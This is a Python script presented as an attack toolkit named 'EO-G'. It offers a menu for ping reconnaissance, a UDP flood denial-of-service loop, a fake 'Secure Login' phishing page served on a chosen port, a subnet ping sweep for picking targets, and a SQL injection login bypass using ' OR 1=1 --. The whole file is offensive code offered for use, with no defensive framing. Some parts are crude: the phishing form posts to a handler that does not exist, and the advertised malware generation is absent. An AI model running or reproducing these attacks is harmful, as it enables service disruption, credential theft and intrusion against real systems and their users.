import os
import socket
import random
import subprocess
from http.server import SimpleHTTPRequestHandler, HTTPServer
import requests  # For SQL Injection functionality


# Display Banner
def display_banner():
    banner = """
    ███████╗ ██████╗ ██████╗ ███████╗
    ██╔════╝██╔════╝██╔═══██╗██╔════╝
    █████╗  ██║     ██║   ██║███████╗
    ██╔══╝  ██║     ██║   ██║╚════██║
    ███████╗╚██████╗╚██████╔╝███████║
    ╚══════╝ ╚═════╝ ╚═════╝ ╚══════╝
    EO-G Toolkit with Dynamic Malware Generation
    """
    print(banner)


try:
    display_banner()
except Exception as e:
    print(f"Error displaying banner: {e}")


# EO-G Real System
class EOGReal:
    def __init__(self):
        self.target = None

    def recon_target(self, target_ip):
        """
        Perform reconnaissance by pinging the target.
        """
        print(f"Reconnaissance initiated on target: {target_ip}")
        try:
            response = subprocess.run(["ping", "-c", "1", target_ip], capture_output=True, text=True)
            if "1 packets transmitted, 1 received" in response.stdout:
                print(f"Target {target_ip} is active.")
                self.target = target_ip
            else:
                print(f"Target {target_ip} is not responding.")
        except Exception as e:
            print(f"Recon error: {e}")

    def ddos_attack(self, target_ip, duration=10):
        """
        Perform a UDP flood attack.
        """
        print(f"Starting DDoS attack on {target_ip} for {duration} seconds...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(1024)
        end_time = os.times().elapsed + duration

        while os.times().elapsed < end_time:
            try:
                sock.sendto(payload, (target_ip, 80))
            except Exception as e:
                print(f"Error during DDoS attack: {e}")
        print("DDoS attack completed.")

    def phishing_page(self, port=8080):
        """
        Set up a phishing server.
        """
        print(f"Starting phishing server on port {port}")
        phishing_html = """
        <html>
        <body>
            <h1>Secure Login</h1>
            <form method="POST" action="/submit">
                <input type="text" name="username" placeholder="Username"><br>
                <input type="password" name="password" placeholder="Password"><br>
                <button type="submit">Login</button>
            </form>
        </body>
        </html>
        """
        with open("index.html", "w") as f:
            f.write(phishing_html)

        os.chdir(os.path.dirname(os.path.abspath("index.html")))
        try:
            server = HTTPServer(("0.0.0.0", port), SimpleHTTPRequestHandler)
            print(f"Phishing server running at http://0.0.0.0:{port}. Press Ctrl+C to stop.")
            server.serve_forever()
        except KeyboardInterrupt:
            print("\nPhishing server stopped.")
            server.server_close()

    def detect_nearby_devices(self):
        """
        Detect nearby devices on the network using ARP ping.
        """
        print("Scanning for nearby devices...")
        try:
            local_ip = socket.gethostbyname(socket.gethostname())
            subnet = ".".join(local_ip.split(".")[:-1]) + "."
            print(f"Scanning subnet: {subnet}0/24")

            devices = []
            for i in range(1, 255):
                ip = f"{subnet}{i}"
                result = subprocess.run(["ping", "-c", "1", ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                if "1 packets transmitted, 1 received" in result.stdout.decode():
                    devices.append(ip)

            if not devices:
                print("No devices found on the network.")
                return None

            print("\nNearby Devices:")
            for index, device in enumerate(devices, start=1):
                print(f"{index}. IP: {device}")

            choice = int(input("Select a device to target (by number): "))
            selected_device = devices[choice - 1]
            print(f"Selected Device - IP: {selected_device}")
            return selected_device
        except Exception as e:
            print(f"Error during device detection: {e}")
            return None

    def sql_injection_attack(self, target_url):
        """
        Perform a basic SQL injection attack.
        """
        print(f"Launching SQL injection attack on {target_url}")
        try:
            payload = {"username": "' OR 1=1 --", "password": "irrelevant"}
            response = requests.post(target_url, data=payload)
            if response.status_code == 200:
                print("SQL injection succeeded!")
                print("Response:", response.text)
            else:
                print("SQL injection failed.")
        except Exception as e:
            print(f"Error during SQL injection: {e}")


# EO-G Control Panel
def eog_control():
    agent = EOGReal()
    while True:
        print("\nEO-G Options:")
        print("1. Recon Target")
        print("2. DDoS Attack")
        print("3. Phishing Server")
        print("4. Detect Nearby Devices")
        print("5. SQL Injection Attack")
        print("6. Exit")
        choice = input("Choose an option: ")

        if choice == "1":
            target = input("Enter the target IP: ")
            agent.recon_target(target)
        elif choice == "2":
            target = input("Enter the target IP: ")
            duration = int(input("Enter the attack duration (seconds): "))
            agent.ddos_attack(target, duration)
        elif choice == "3":
            port = int(input("Enter the port for the phishing server: "))
            agent.phishing_page(port)
        elif choice == "4":
            target_ip = agent.detect_nearby_devices()
            if target_ip:
                print(f"Targeting device: {target_ip}")
        elif choice == "5":
            target_url = input("Enter the target URL for SQL injection: ")
            agent.sql_injection_attack(target_url)
        elif choice == "6":
            print("Exiting EO-G Toolkit.")
            break
        else:
            print("Invalid choice. Please try again.")


# Run EO-G Control
if __name__ == "__main__":
    eog_control()
